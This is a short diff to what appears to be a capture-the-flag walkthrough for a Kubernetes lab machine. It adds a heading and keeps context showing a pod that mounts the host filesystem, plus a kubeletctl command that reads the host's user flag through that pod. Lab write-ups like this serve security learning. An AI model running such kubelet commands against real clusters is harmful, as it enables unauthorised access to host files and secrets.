@@ -309,6 +309,7 @@ nginx    1/1     Running   0          85m
 nginxt   1/1     Running   0          23s
 ```
 
+### user.txt and root.txt flags
 The pod has been created with the filesystem of the main system in its /root directory. We can then retrieve the user and root flags as follows:
 
 `kubeletctl run "cat /root/home/user/user.txt" --pod nginxt --container nginxt --server 10.10.11.133`
